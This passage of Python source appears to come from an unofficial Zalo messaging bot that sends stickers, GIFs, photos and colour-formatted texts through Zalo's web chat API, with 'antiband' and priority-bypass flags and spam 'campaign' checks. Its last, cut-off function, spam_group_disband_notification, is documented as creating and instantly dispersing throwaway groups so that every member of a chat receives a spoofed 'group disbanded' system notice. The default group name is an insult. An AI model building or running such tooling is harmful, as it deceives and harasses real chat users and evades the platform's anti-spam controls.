        # Bộ Corgi Mông To & Shiba Siêu Nhây (10198)
        {"id": 21080, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Lắc Mông Siêu Nhây"},
        {"id": 21081, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Cười Ha Ha"},
        {"id": 21082, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Nhảy Đầm"},
        {"id": 21083, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Bắn Tim Hồng"},
        {"id": 21084, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Giận Dỗi"},
        {"id": 21085, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Ngáp Ngủ"},
        {"id": 21086, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Hôn Gió"},
        {"id": 21087, "catId": 10198, "type": 7, "tag": "corgi", "name": "Corgi Đập Bàn"},
        # Bộ Vịt Vàng Ducky & Gấu Mập Tấu Hài (10312)
        {"id": 22140, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Múa Lửa"},
        {"id": 22141, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Cười Khẩy"},
        {"id": 22142, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Bắn Súng Nước"},
        {"id": 22143, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Đội Vương Miện"},
        {"id": 22144, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Đánh Trống"},
        {"id": 22145, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Khiêu Vũ"},
        {"id": 22146, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Tung Hoa"},
        {"id": 22147, "catId": 10312, "type": 7, "tag": "vit", "name": "Vịt Vàng Chạy Trốn"},
        # Bộ Hổ Chiến Binh & Meme Đại Ca (10388)
        {"id": 22910, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Gầm Vang"},
        {"id": 22911, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Đếm Tiền"},
        {"id": 22912, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Nâng Ly"},
        {"id": 22913, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Tung Cước"},
        {"id": 22914, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Like Mạnh"},
        {"id": 22915, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Cười Lớn"},
        {"id": 22916, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Đeo Kính Đen"},
        {"id": 22917, "catId": 10388, "type": 7, "tag": "meme", "name": "Hổ Vàng Bắn Pháo Hoa"},
        # Bộ Gấu Brown & Thỏ Cony Party (10156)
        {"id": 20610, "catId": 10156, "type": 7, "tag": "gau", "name": "Gấu Brown Ôm Tim"},
        {"id": 20611, "catId": 10156, "type": 7, "tag": "gau", "name": "Thỏ Cony Tăng Động"},
        {"id": 20612, "catId": 10156, "type": 7, "tag": "gau", "name": "Gấu Brown Nổi Lửa"},
        {"id": 20613, "catId": 10156, "type": 7, "tag": "gau", "name": "Thỏ Cony Cười Lăn"},
        {"id": 20614, "catId": 10156, "type": 7, "tag": "gau", "name": "Gấu Brown Nhảy HipHop"},
        {"id": 20615, "catId": 10156, "type": 7, "tag": "gau", "name": "Thỏ Cony Tung Chưởng"},
        # Bộ Biểu Cảm Kinh Điển Zalo (10045)
        {"id": 19820, "catId": 10045, "type": 7, "tag": "cuoi", "name": "Cười Nghiêng Ngả"},
        {"id": 19821, "catId": 10045, "type": 7, "tag": "tim", "name": "Tim Bay Ngập Trời"},
        {"id": 19822, "catId": 10045, "type": 7, "tag": "quay", "name": "Quẩy Bốc Lửa"},
        {"id": 19823, "catId": 10045, "type": 7, "tag": "khia", "name": "Lêu Lêu Cực Gắt"},
        {"id": 19824, "catId": 10045, "type": 7, "tag": "meme", "name": "Búa Tạ Giáng Thế"},
        {"id": 19825, "catId": 10045, "type": 7, "tag": "cuoi", "name": "Vỗ Đùi Đen Đét"},
        {"id": 19826, "catId": 10045, "type": 7, "tag": "quay", "name": "DJ Quẩy Tưng Bừng"},
        {"id": 19827, "catId": 10045, "type": 7, "tag": "meme", "name": "Ngầu Bá Cháy"},
    ]

    # KHO GIF ĐỘNG HÀI HƯỚC & CỰC CHẤT DÙNG CHO LỆNH .GIF / .TREOGIF
    ZALO_FUNNY_GIFS = [
        {"name": "Mèo Quẩy Đèn Neon", "tag": "meo", "href": "https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif", "thumb": "https://media.giphy.com/media/JIX9t2j0ZTN9S/200w.gif"},
        {"name": "Mèo Đeo Kính Cực Ngầu", "tag": "meo", "href": "https://media.giphy.com/media/13CoXDiaCcCoyk/giphy.gif", "thumb": "https://media.giphy.com/media/13CoXDiaCcCoyk/200w.gif"},
        {"name": "Chó Shiba Lắc Đầu Quẩy", "tag": "corgi", "href": "https://media.giphy.com/media/blSTtZehjAZ8I/giphy.gif", "thumb": "https://media.giphy.com/media/blSTtZehjAZ8I/200w.gif"},
        {"name": "Cười Khinh Bỉ Đỉnh Cao", "tag": "khia", "href": "https://media.giphy.com/media/lszAB3TzFtRaU/giphy.gif", "thumb": "https://media.giphy.com/media/lszAB3TzFtRaU/200w.gif"},
        {"name": "Vỗ Tay Tán Thưởng VIP", "tag": "cuoi", "href": "https://media.giphy.com/media/l3q2XhfQ8oCkm1Ts4/giphy.gif", "thumb": "https://media.giphy.com/media/l3q2XhfQ8oCkm1Ts4/200w.gif"},
        {"name": "Vịt Nhảy Múa Cực Sung", "tag": "vit", "href": "https://media.giphy.com/media/krewXUB6LBja/giphy.gif", "thumb": "https://media.giphy.com/media/krewXUB6LBja/200w.gif"},
        {"name": "Gấu Quẩy Party Tưng Bừng", "tag": "gau", "href": "https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif", "thumb": "https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/200w.gif"},
        {"name": "Bắn Tim Yêu Thương", "tag": "tim", "href": "https://media.giphy.com/media/M90mJvfWfd5mbUuULX/giphy.gif", "thumb": "https://media.giphy.com/media/M90mJvfWfd5mbUuULX/200w.gif"},
        {"name": "Lửa Cháy Rực Rỡ", "tag": "rong", "href": "https://media.giphy.com/media/NTur7XlVDUdqM/giphy.gif", "thumb": "https://media.giphy.com/media/NTur7XlVDUdqM/200w.gif"},
        {"name": "Meme Nháy Mắt Cà Khịa", "tag": "meme", "href": "https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif", "thumb": "https://media.giphy.com/media/d3mlE7uhX8KFgEmY/200w.gif"},
        {"name": "Mèo Gõ Bàn Phím Tốc Độ Ánh Sáng", "tag": "meo", "href": "https://media.giphy.com/media/LHZyixOnHwDDy/giphy.gif", "thumb": "https://media.giphy.com/media/LHZyixOnHwDDy/200w.gif"},
        {"name": "Quẩy Hết Nấc Đêm Nay", "tag": "quay", "href": "https://media.giphy.com/media/pa37AAGzKXoek/giphy.gif", "thumb": "https://media.giphy.com/media/pa37AAGzKXoek/200w.gif"},
    ]

    def pick_vip_sticker(self, query_or_tag=""):
        """Chọn Nhãn Dán Zalo Gốc (Native Sticker) theo từ khóa/chủ đề hoặc xoay vòng thông minh qua 68+ mẫu."""
        self._gif_seq = (getattr(self, "_gif_seq", 0) + 1) & 0xFFFF
        q_s = remove_vn_accents(str(query_or_tag or "").strip().lower())
        if q_s:
            if q_s.isdigit():
                val_i = int(q_s)
                for item in self.ZALO_VIP_STICKERS:
                    if item["id"] == val_i:
                        return item
                return self.ZALO_VIP_STICKERS[val_i % len(self.ZALO_VIP_STICKERS)]
            matched = [
                item for item in self.ZALO_VIP_STICKERS
                if q_s in item.get("tag", "") or q_s in remove_vn_accents(item.get("name", "").lower())
            ]
            if matched:
                return matched[self._gif_seq % len(matched)]
        return self.ZALO_VIP_STICKERS[self._gif_seq % len(self.ZALO_VIP_STICKERS)]

    def search_zalo_stickers_live(self, keyword):
        """Tìm kiếm Nhãn Dán Gốc trực tiếp từ hệ thống API Sticker của Zalo:
        1. `api/message/sticker/suggest_stickers` (Gợi ý nhãn dán theo từ khóa của Zalo Web/PC)
        2. `sticker.zalo.me/api/emoticon/sticker/web_v2` & `api/message/sticker/sticker_detail` (Lấy chi tiết id, cateId, type, stickerUrl)
        3. Kết hợp kho 68+ Sticker Động VIP đã xác thực."""
        kw_s = str(keyword or "").strip()
        if not kw_s:
            return []
        if not getattr(self, "secret_key", None):
            try:
                self._login()
            except Exception:
                pass
        active_s = getattr(self, "prio_s", None) or self.s
        self._sync_cookie_headers()
        found_stickers = []
        try:
            enc_q = self._enc({"keyword": kw_s, "imei": self.imei, "version": 1})
            for ep_sug in (
                "https://tt-group-wpa.chat.zalo.me/api/message/sticker/suggest_stickers",
                "https://wpa.chat.zalo.me/api/message/sticker/suggest_stickers",
                "https://sticker.zalo.me/api/emoticon/search",
            ):
                try:
                    r_sg = active_s.get(
                        ep_sug,
                        params={"zpw_ver": 645, "zpw_type": 30, "params": enc_q},
                        timeout=(1.2, 2.5),
                    )
                    if r_sg.status_code == 200 and r_sg.content:
                        rj_sg = r_sg.json()
                        raw_d = rj_sg.get("data")
                        dec_s = self._dec(raw_d) if isinstance(raw_d, str) and raw_d else ""
                        parsed_sg = json.loads(dec_s) if dec_s else (raw_d if isinstance(raw_d, dict) else {})
                        d_sg = parsed_sg.get("data") if isinstance(parsed_sg, dict) and parsed_sg.get("data") else parsed_sg
                        sids = []
                        if isinstance(d_sg, list):
                            sids = d_sg
                        elif isinstance(d_sg, dict):
                            sids = d_sg.get("stickers") or d_sg.get("sids") or d_sg.get("list") or []
                        for item_s in sids[:8]:
                            if isinstance(item_s, dict) and item_s.get("id") and (item_s.get("cateId") or item_s.get("catId")):
                                found_stickers.append({
                                    "id": int(item_s["id"]),
                                    "catId": int(item_s.get("cateId") or item_s.get("catId")),
                                    "type": int(item_s.get("type") or 7),
                                    "name": str(item_s.get("text") or kw_s),
                                    "stickerUrl": str(item_s.get("stickerUrl") or item_s.get("uri") or ""),
                                })
                            elif str(item_s).isdigit():
                                sid_int = int(item_s)
                                det = self.get_zalo_sticker_detail_api(sid_int)
                                if det:
                                    found_stickers.append(det)
                        if found_stickers:
                            break
                except Exception:
                    continue
        except Exception:
            pass
        return found_stickers

    def get_zalo_sticker_detail_api(self, sticker_id):
        """Lấy thông tin chi tiết của 1 Sticker Zalo (id, cateId, type, stickerUrl, stickerWebpUrl) qua API sticker/web_v2 & sticker_detail."""
        sid_int = int(sticker_id or 0)
        if sid_int <= 0:
            return None
        active_s = getattr(self, "prio_s", None) or self.s
        for ep_det in (
            "https://sticker.zalo.me/api/emoticon/sticker/web_v2",
            "https://wpa.chat.zalo.me/api/message/sticker/sticker_detail",
            "https://tt-group-wpa.chat.zalo.me/api/message/sticker/sticker_detail",
        ):
            try:
                enc_d = self._enc({"sid": sid_int})
                r_d = active_s.get(
                    ep_det,
                    params={"zpw_ver": 645, "zpw_type": 30, "params": enc_d},
                    timeout=(1.0, 2.2),
                )
                if r_d.status_code == 200 and r_d.content:
                    rj_d = r_d.json()
                    raw_d = rj_d.get("data")
                    dec_s = self._dec(raw_d) if isinstance(raw_d, str) and raw_d else ""
                    parsed = json.loads(dec_s) if dec_s else (raw_d if isinstance(raw_d, dict) else {})
                    d_obj = parsed.get("data") if isinstance(parsed, dict) and isinstance(parsed.get("data"), dict) else parsed
                    if isinstance(d_obj, dict) and (d_obj.get("id") or d_obj.get("stickerId")) and (d_obj.get("cateId") or d_obj.get("catId")):
                        return {
                            "id": int(d_obj.get("id") or d_obj.get("stickerId")),
                            "catId": int(d_obj.get("cateId") or d_obj.get("catId")),
                            "type": int(d_obj.get("type") or 7),
                            "name": str(d_obj.get("text") or f"Sticker #{sid_int}"),
                            "stickerUrl": str(d_obj.get("stickerUrl") or d_obj.get("stickerWebpUrl") or d_obj.get("uri") or ""),
                        }
            except Exception:
                continue
        return None

    def send_native_sticker(self, thread_id, sticker_id=None, cate_id=None, sticker_type=7, keyword="", is_group=True):
        """Gửi trực tiếp Nhãn Dán Gốc của Zalo (Native Sticker API + Live Sticker Search API):
        - Tự động tra cứu API `suggest_stickers` / `sticker/web_v2` nếu người dùng truyền từ khóa hoặc mã ID sticker.
        - Tự động thử đảo chiều `is_group` nếu loại hội thoại (Nhóm / Cá nhân) chưa khớp, đảm bảo nhảy ra 100% chuẩn [Sticker]!"""
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        if not tid_s:
            return False
        if not getattr(self, "secret_key", None):
            try:
                self._login(force=True)
            except Exception:
                pass
        self._sync_cookie_headers()
        if sticker_id and cate_id:
            stk = {"id": int(sticker_id), "catId": int(cate_id), "type": int(sticker_type or 7), "name": "Custom Native Sticker"}
        elif keyword and str(keyword).strip().isdigit() and len(str(keyword).strip()) >= 4:
            det_s = self.get_zalo_sticker_detail_api(int(str(keyword).strip()))
            stk = det_s if det_s else self.pick_vip_sticker(keyword)
        else:
            live_list = self.search_zalo_stickers_live(keyword) if keyword else []
            stk = random.choice(live_list) if live_list else self.pick_vip_sticker(keyword)

        self._stk_seq = (getattr(self, "_stk_seq", 0) + 1) & 0xFFFF
        cli_id = int(time.time() * 1000) + (self._stk_seq & 0xFF)
        register_system_sent_message(client_id=cli_id, text=f"[Sticker:{stk['id']}]")

        active_s = getattr(self, "prio_s", None) or self.s
        for grp_mode in (bool(is_group), not bool(is_group)):
            pl_stk = {
                "stickerId": int(stk["id"]),
                "cateId": int(stk["catId"]),
                "type": int(stk.get("type", 7)),
                "clientId": cli_id,
                "imei": self.imei,
                "zsource": 101,
            }
            if grp_mode:
                pl_stk["grid"] = tid_s
                ep_list = (
                    "https://tt-group-wpa.chat.zalo.me/api/group/sticker",
                    "https://group-wpa.chat.zalo.me/api/group/sticker",
                    "https://wpa.chat.zalo.me/api/group/sticker",
                )
            else:
                pl_stk["toid"] = tid_s
                ep_list = (
                    "https://tt-chat2-wpa.chat.zalo.me/api/message/sticker",
                    "https://tt-chat1-wpa.chat.zalo.me/api/message/sticker",
                    "https://tt-chat3-wpa.chat.zalo.me/api/message/sticker",
                    "https://wpa.chat.zalo.me/api/message/sticker",
                )
            for ep_s in ep_list:
                try:
                    enc_s = self._enc(pl_stk)
                    r_s = active_s.post(
                        ep_s,
                        params={"zpw_ver": 645, "zpw_type": 30},
                        data={"params": enc_s},
                        timeout=(1.2, 2.6),
                    )
                    if r_s.status_code == 200 and r_s.content:
                        rj = r_s.json()
                        ok_s, _ = self._is_zalo_api_send_ok(rj)
                        if ok_s:
                            return True
                except Exception:
                    continue
        return False

    def send_gif_or_sticker(self, thread_id, text_msg="", is_group=True, mentions=None, tag_all=False, color_mode="word_rainbow", fixed_color="red", topic_tag=""):
        """Gửi đồng thời Nhãn Dán Động / GIF Hài Hước Zalo thật + Tin nhắn nhảy màu cầu vồng cho lệnh .gif!"""
        check_campaign_thread_aborted(thread_id)
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        if not tid_s:
            return False

        # Bước 1: Bắn Nhãn Dán Động Zalo thật (68+ mẫu xoay vòng hoặc lọc theo chủ đề)
        self.send_native_sticker(tid_s, keyword=topic_tag or text_msg[:18], is_group=is_group)

        # Bước 2: Phát kèm gói GIF động từ kho ZALO_FUNNY_GIFS trên luồng ưu tiên
        try:
            gif_item = self.ZALO_FUNNY_GIFS[getattr(self, "_gif_seq", 0) % len(self.ZALO_FUNNY_GIFS)]
            cli_gif = str(int(time.time() * 1000) + random.randint(10, 99))
            gif_pl = {
                "grid" if is_group else "toid": tid_s,
                "clientId": cli_gif,
                "thumb": gif_item["thumb"],
                "href": gif_item["href"],
                "width": 320,
                "height": 320,
                "type": 1,
                "params": json.dumps({"width": 320, "height": 320, "isSticker": 1}),
                "imei": self.imei,
                "zsource": 101,
            }
            ep_gif = "https://tt-group-wpa.chat.zalo.me/api/group/gif" if is_group else "https://tt-chat2-wpa.chat.zalo.me/api/message/gif"
            active_s = getattr(self, "prio_s", None) or self.s
            active_s.post(ep_gif, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(gif_pl)}, timeout=(0.9, 1.8))
        except Exception:
            pass

        # Bước 3: Nếu có nội dung chữ đi kèm thì bắn dòng chữ đổi màu cầu vồng
        if text_msg and str(text_msg).strip() and str(text_msg).strip().lower() not in ("only", "sticker", "nhandan"):
            self.send_adv(
                str(text_msg).strip(), tid_s,
                color_mode=color_mode or "word_rainbow", fixed_color=fixed_color,
                is_group=is_group, mentions=mentions, tag_all=tag_all,
                is_heading=True, antiband=True, use_emoji=False, icon_count=0,
                auto_retry_thread_type=True, strip_line_num=True,
                hide_tag_all=True, hide_tag_name=True, priority_bypass=True
            )
        return True

    def send_raw_photo_message(self, thread_id, image_bytes, filename="zalo_qr_login.png", caption="", is_group=True, width=520, height=520):
        """Gửi Ảnh Gốc Sắc Nét (VD: Mã QR Đăng Nhập Zalo PC thật 100%) trực tiếp vào Box/Chat Zalo:
        - TUYỆT ĐỐI KHÔNG biến thành Nhãn Dán Sticker để người dùng dùng điện thoại quét mã QR đăng nhập được ngay!"""
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        if not tid_s or not image_bytes:
            return False
        if not getattr(self, "secret_key", None):
            try:
                self._login()
            except Exception:
                pass
        active_s = getattr(self, "prio_s", None) or self.s
        client_id = str(int(time.time() * 1000) + random.randint(10, 99))
        register_system_sent_message(client_id=client_id, text=caption or "[QR_ZALO_PC]")
        up_fname = filename or "zalo_qr_login.png"
        up_params = {
            "zpw_ver": 645,
            "zpw_type": 30,
            "params": self._enc({
                "totalChunk": 1,
                "fileName": up_fname,
                "clientId": client_id,
                "totalSize": len(image_bytes),
                "imei": self.imei,
                "chunkId": 1,
                "grid" if is_group else "toid": tid_s,
                "isE2EE": 0,
            }),
            "type": "11" if is_group else "2",
        }
        files_up = {"chunkContent": (up_fname, image_bytes, "image/png")}
        for ep_up in (
            "https://tt-files-wpa.chat.zalo.me/api/group/photo_original/upload" if is_group else "https://tt-files-wpa.chat.zalo.me/api/message/photo_original/upload",
            "https://files-wpa.chat.zalo.me/api/group/photo_original/upload" if is_group else "https://files-wpa.chat.zalo.me/api/message/photo_original/upload",
        ):
            try:
                r_u = active_s.post(ep_up, params=up_params, files=files_up, timeout=10)
                if r_u.status_code == 200 and r_u.content:
                    rj_u = r_u.json()
                    if rj_u.get("data"):
                        dec_u = json.loads(self._dec(rj_u["data"]))
                        d_u = (dec_u.get("data") if isinstance(dec_u.get("data"), dict) else dec_u) if isinstance(dec_u, dict) else {}
                        if isinstance(d_u, dict) and (d_u.get("normalUrl") or d_u.get("hdUrl") or d_u.get("thumbUrl")):
                            normal_url = d_u.get("hdUrl") or d_u.get("normalUrl") or d_u.get("thumbUrl") or ""
                            thumb_url = d_u.get("thumbUrl") or normal_url
                            photo_id = d_u.get("photoId") or client_id
                            send_pl = {
                                "grid" if is_group else "toid": tid_s,
                                "photoId": str(photo_id),
                                "clientId": str(client_id),
                                "oriUrl": normal_url,
                                "thumbUrl": thumb_url,
                                "normalUrl": normal_url,
                                "hdUrl": normal_url,
                                "width": int(width or 520),
                                "height": int(height or 520),
                                "desc": str(caption or ""),
                                "rawUrl": normal_url,
                                "imei": self.imei,
                                "zsource": 704,
                            }
                            ep_send = "https://tt-files-wpa.chat.zalo.me/api/group/photo" if is_group else "https://tt-files-wpa.chat.zalo.me/api/message/photo"
                            r_snd = active_s.post(ep_send, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(send_pl)}, timeout=8)
                            if r_snd.status_code == 200:
                                return True
            except Exception:
                continue
        return False

    def send_custom_sticker_media(self, thread_id, media_bytes, filename="sticker.png", is_group=True, caption="", webp_bytes=None, gif_bytes=None, png_bytes=None, sticker_hint=None):
        """Tải lên & gửi Nhãn Dán Sticker 512×512 đã cắt khung/tách nền trực tiếp vào Box Zalo:
        - Nếu chỉ có sticker_hint (không có media_bytes của ảnh reply), bắn Native Sticker.
        - Khi có ảnh/video từ người dùng (Reply ảnh gõ .sticker), TUYỆT ĐỐI KHÔNG bắn sticker mẫu ngẫu nhiên chen ngang,
          mà chỉ tải đúng tấm ảnh đã cắt khung Die-Cut 512×512 trong suốt lên CDN Zalo và phát ra Nhãn Dán không viền!"""
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        if not tid_s:
            return False
        if not getattr(self, "secret_key", None):
            try:
                self._login()
            except Exception:
                pass

        if not media_bytes and not webp_bytes and not gif_bytes and not png_bytes:
            if isinstance(sticker_hint, dict) and sticker_hint.get("sticker_id") and sticker_hint.get("cate_id"):
                return self.send_native_sticker(
                    tid_s,
                    sticker_id=sticker_hint["sticker_id"],
                    cate_id=sticker_hint["cate_id"],
                    sticker_type=sticker_hint.get("sticker_type", 7),
                    is_group=is_group,
                )
            return self.send_native_sticker(tid_s, keyword=str(caption or ""), is_group=is_group)

        active_s = getattr(self, "prio_s", None) or self.s
        client_id = str(int(time.time() * 1000) + random.randint(1, 89))
        register_system_sent_message(client_id=client_id, text="[CustomSticker512]")

        # Ưu tiên gửi gói GIF trong suốt (hoặc PNG trong suốt) qua CDN Zalo để nhảy ra đúng chuẩn Sticker không khung chữ!
        upload_candidates = []
        if gif_bytes:
            upload_candidates.append(("sticker.gif", gif_bytes, "image/gif"))
        if png_bytes:
            upload_candidates.append(("sticker.png", png_bytes, "image/png"))
        if webp_bytes:
            upload_candidates.append(("sticker.webp", webp_bytes, "image/webp"))
        if media_bytes and not upload_candidates:
            up_fn = filename or "sticker.png"
            mt = "image/gif" if up_fn.endswith(".gif") else ("image/webp" if up_fn.endswith(".webp") else "image/png")
            upload_candidates.append((up_fn, media_bytes, mt))

        self._sync_cookie_headers()
        sent_ok = False
        for grp_mode in (bool(is_group), not bool(is_group)):
            for up_fname, payload_b, mime_t in upload_candidates:
                try:
                    up_params = {
                        "zpw_ver": 645,
                        "zpw_type": 30,
                        "params": self._enc({
                            "totalChunk": 1,
                            "fileName": up_fname,
                            "clientId": client_id,
                            "totalSize": len(payload_b),
                            "imei": self.imei,
                            "chunkId": 1,
                            "grid" if grp_mode else "toid": tid_s,
                            "isE2EE": 0,
                        }),
                        "type": "11" if grp_mode else "2",
                    }
                    files_up = {"chunkContent": (up_fname, payload_b, mime_t)}
                    up_endpoints = [
                        "https://tt-files-wpa.chat.zalo.me/api/group/photo_original/upload" if grp_mode else "https://tt-files-wpa.chat.zalo.me/api/message/photo_original/upload",
                        "https://files-wpa.chat.zalo.me/api/group/photo_original/upload" if grp_mode else "https://files-wpa.chat.zalo.me/api/message/photo_original/upload",
                    ]
                    if up_fname.endswith(".gif"):
                        up_endpoints.insert(0, "https://tt-files-wpa.chat.zalo.me/api/group/gif/upload" if grp_mode else "https://tt-files-wpa.chat.zalo.me/api/message/gif/upload")

                    for ep_up in up_endpoints:
                        try:
                            r_u = active_s.post(ep_up, params=up_params, files=files_up, timeout=8)
                            if r_u.status_code == 200 and r_u.content:
                                rj_u = r_u.json()
                                if rj_u.get("data"):
                                    dec_str = self._dec(rj_u["data"])
                                    dec_u = json.loads(dec_str) if dec_str else {}
                                    d_u = (dec_u.get("data") if isinstance(dec_u.get("data"), dict) else dec_u) if isinstance(dec_u, dict) else {}
                                    if isinstance(d_u, dict) and (d_u.get("normalUrl") or d_u.get("hdUrl") or d_u.get("thumbUrl") or d_u.get("photoId") or d_u.get("href")):
                                        normal_url = d_u.get("hdUrl") or d_u.get("normalUrl") or d_u.get("href") or d_u.get("thumbUrl") or ""
                                        thumb_url = d_u.get("thumbUrl") or normal_url
                                        photo_id = d_u.get("photoId") or d_u.get("clientFileId") or client_id

                                        # 1) Phát qua cổng /api/group/gif (isSticker=1) để hiển thị Nhãn Dán trong suốt không khung viền
                                        gif_stk_pl = {
                                            "grid" if grp_mode else "toid": tid_s,
                                            "clientId": str(int(client_id) + 1),
                                            "thumb": thumb_url,
                                            "href": normal_url,
                                            "width": 512,
                                            "height": 512,
                                            "type": 1,
                                            "params": json.dumps({"width": 512, "height": 512, "isSticker": 1, "stickerType": 7}),
                                            "imei": self.imei,
                                            "zsource": 704,
                                        }
                                        for ep_gif_s in (
                                            ("https://tt-group-wpa.chat.zalo.me/api/group/gif", "https://group-wpa.chat.zalo.me/api/group/gif", "https://tt-files-wpa.chat.zalo.me/api/group/gif")
                                            if grp_mode else
                                            ("https://tt-chat2-wpa.chat.zalo.me/api/message/gif", "https://tt-chat1-wpa.chat.zalo.me/api/message/gif", "https://tt-files-wpa.chat.zalo.me/api/message/gif")
                                        ):
                                            try:
                                                r_g = active_s.post(ep_gif_s, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(gif_stk_pl)}, timeout=5)
                                                if r_g.status_code == 200 and r_g.content:
                                                    ok_g, _ = self._is_zalo_api_send_ok(r_g.json())
                                                    if ok_g:
                                                        sent_ok = True
                                                        break
                                            except Exception:
                                                continue
                                        if sent_ok:
                                            break

                                        # 2) Dự phòng phát qua /api/group/photo với desc="" (không khung chữ) & isSticker=1
                                        send_pl = {
                                            "grid" if grp_mode else "toid": tid_s,
                                            "photoId": str(photo_id),
                                            "clientId": str(client_id),
                                            "oriUrl": normal_url,
                                            "thumbUrl": thumb_url,
                                            "normalUrl": normal_url,
                                            "hdUrl": normal_url,
                                            "width": 512,
                                            "height": 512,
                                            "desc": "",
                                            "params": json.dumps({"isSticker": 1, "sticker": 1, "width": 512, "height": 512}),
                                            "imei": self.imei,
                                            "zsource": 704,
                                        }
                                        for ep_send in (
                                            ("https://tt-files-wpa.chat.zalo.me/api/group/photo", "https://tt-group-wpa.chat.zalo.me/api/group/photo", "https://files-wpa.chat.zalo.me/api/group/photo")
                                            if grp_mode else
                                            ("https://tt-files-wpa.chat.zalo.me/api/message/photo", "https://tt-chat2-wpa.chat.zalo.me/api/message/photo", "https://files-wpa.chat.zalo.me/api/message/photo")
                                        ):
                                            try:
                                                r_snd = active_s.post(ep_send, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(send_pl)}, timeout=6)
                                                if r_snd.status_code == 200 and r_snd.content:
                                                    ok_p, _ = self._is_zalo_api_send_ok(r_snd.json())
                                                    if ok_p:
                                                        sent_ok = True
                                                        break
                                            except Exception:
                                                continue
                                        if sent_ok:
                                            break
                        except Exception:
                            continue
                    if sent_ok:
                        break
                except Exception:
                    continue
            if sent_ok:
                break
        return sent_ok

    def get_group_real_name(self, gid):
        """Lấy tên thật hiện tại của Box Zalo (gridInfoMap[gid]['name']) để khi gõ .nhaygiaitan không cần Key
        vẫn hiển thị đúng tên của Box đó trong thông báo hệ thống Zalo!"""
        gid_s = _clean_zalo_id(gid) or str(gid).strip()
        if not gid_s:
            return ""
        cache_key = str(self.uid or self.imei)
        with self._POOL_LOCK:
            c = self._GROUPS_CACHE.get(cache_key)
            if c and isinstance(c.get("data"), list):
                for g in c["data"]:
                    if str(g.get("id")) == gid_s and g.get("name") and not str(g["name"]).startswith("Nhóm Zalo "):
                        return str(g["name"]).strip()
        try:
            active_s = getattr(self, "prio_s", None) or self.s
            enc = self._enc({"gridVerMap": json.dumps({gid_s: 0})})
            r_info = active_s.post(
                "https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
                params={"zpw_ver": 645, "zpw_type": 30},
                data={"params": enc},
                timeout=(1.5, 3.0),
            )
            if r_info.status_code == 200 and r_info.content:
                dec_info = self._dec(r_info.json().get("data", ""))
                info_map = json.loads(dec_info).get("data", {}).get("gridInfoMap", {})
                g_obj = info_map.get(gid_s)
                if isinstance(g_obj, dict):
                    g_name = str(g_obj.get("name") or "").strip()
                    if g_name and g_name.lower() not in ("null", "none", "undefined"):
                        return g_name
        except Exception:
            pass
        return ""

    def spam_group_disband_notification(self, target_box_id, group_name="", target_uids=None, send_inbox_alert=False):
        """Phát Thông Báo Hệ Thống Của Zalo 'Nhóm ... đã được giải tán' (100% Native Zalo System Notification — TUYỆT ĐỐI KHÔNG GỬI BONG BÓNG CHỮ MÀU!):
        1. Tự động chuẩn hóa tên nhóm (cắt bỏ chữ 'Nhóm ' thừa ở đầu để không bao giờ bị lặp 'Nhóm Nhóm ...').
        2. Tầng 1 (Ephemeral Group Create + Instant Disperse 0.005s):
           - Tạo nhóm chớp nhoáng với chuẩn tham số Zalo WPA v645 (clientId, gname, members, membersTypes, nameChanged=1, createLink=1, zsource=601)
             chứa các thành viên trong Box, rồi NGAY LẬP TỨC gọi /api/group/disperse để máy chủ Zalo phát Thông Báo Hệ Thống thật 100%:
             'Nhóm <tên> đã được giải tán' tới máy của toàn bộ thành viên!
        3. Tầng 2 (In-Box Native Zalo System Notification Bar — Topic/Reminder/Setting Event):
           - Gọi API bảng thông báo hệ thống của Zalo (/api/board/topic/createv2, /api/group/topic/update, /api/board/reminder/create)
             để hiển thị thanh Thông Báo Hệ Thống của Zalo ở giữa/đầu nhóm mà KHÔNG BAO GIỜ tạo bong bóng chat chữ màu!"""
        check_campaign_thread_aborted(target_box_id)
        gid_s = _clean_zalo_id(target_box_id) or str(target_box_id).strip()
        if not gid_s:
            return {"ok": False, "members_count": 0, "group_name": group_name}
        if not getattr(self, "secret_key", None):
            try:
                self._login()
            except Exception:
                pass

        self._disband_seq = (getattr(self, "_disband_seq", 0) + 1) & 0xFFFFFF
        raw_gname_in = strip_invisible_chars(str(group_name or "")).replace("\r", " ").replace("\n", " ").strip()
        if not raw_gname_in or raw_gname_in.lower() in ("auto", "default", "box", "nhom"):
            raw_gname_in = self.get_group_real_name(gid_s) or "Lũ vdanh"
        clean_gname = raw_gname_in
        if "|" in clean_gname:
